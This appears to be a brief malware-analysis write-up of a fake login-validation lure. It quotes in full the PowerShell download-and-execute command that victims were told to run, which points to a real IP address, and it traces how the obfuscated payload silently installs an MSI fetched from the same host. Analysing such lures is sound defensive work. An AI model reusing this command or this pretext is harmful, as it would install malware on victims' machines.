Target Victim was given the powershell command
'powershell -c "iex(irm '85.239.149.40/FnjVsLKEJb2Jall3wx' -UseBasicParsing)'
with the pretext of validating a facit login.

powershell command breakdown:
powershell -c - starts powershell and executes the following
iex - executes the downloaded content as powershell code
irm - downsoads content from url
85.239.149.40/FnjVsLKEJb2Jall3wx - remote server path

upon curlling the contents we get the payload as payload.txt

examining the payload we see obfuscated powershell in Base64
using Chatgpt we find that the encrypted payload is the variable $PzgEetbY

greping the payload variable we get
$PzgEetbY = $cgvALlSmjK + $uByFkjdxlz + $smqaAwWiWT + $iHOCgAJHgt + $WGyOrcdqEj + $rVQzttuJEU + $uvZglYOnxh + $jaztKoGINU + $AJrNVrcOxY + $YNukYXEIdO + $xKdRFbhMAs + $FVTJeIYLfH + $MmmhVwuTAA + $FbVeacWoKe + $QOrHnQPKci + $IgOtyhoTVD + $nSnbtIIpjG + $KcCLJQXcUJ + $PStotCCOkv + $GytGntCyvh + $PyNkarpjIv + $MoPhAUPqBd + $xCuzeWKCGN + $RdxMwrnqWr + $ZNyxVvAUsa + $tUxeOmCQnp + $AnsQyuGXYI + $JhKeWyaMfU + $NLNGcAtJuG + $SVPkonaCdB + $ggEAQLWNVZ + $dtFcwQQUEi + $gFvutKIoiW + $TwOPNALhRr + $PUSVyRMppL + $xnyRpDOntb
$oGCpCSpU = swKfXyNqUa -z $PzgEetbY

we can now see the other variables used to construct the payload, and we can pull all of the variables out with
grep "^$.\*=" sample.ps1 > vars.txt

now we can reconstruct the string with a python script yielding decoded.ps1
we can see that the powershell decrypts the Base64 block $raw yielding b64payload.txt

we can now see that it pulls the msi UICBDMW.msi from http://85.239.149.40:6600
and executes silently with msiexec.exe

we can now curl the file

file UICBDMW.msi
UICBDMW.msi:
Composite Document File V2 Document,
Little Endian,
Os: Windows,
Version 6.2,
MSI Installer,
Code page: 1252,
Title: Installation Database,
Subject: Sizarship,
Author: Veil Patron,
Keywords: Installer,
Comments: This installer database contains the logic and data required to install Sizarship.,
Template: Intel;1033, Revision Number: {F51A9573-09D5-4FA4-9727-4459F5DC5FB1},
Create Time/Date: Tue May 26 23:06:26 2026,
Last Saved Time/Date: Tue May 26 23:06:26 2026,
Number of Pages: 500,
Number of Words: 10,
Name of Creating Application: WiX Toolset (4.0.0.0),
Security: 2
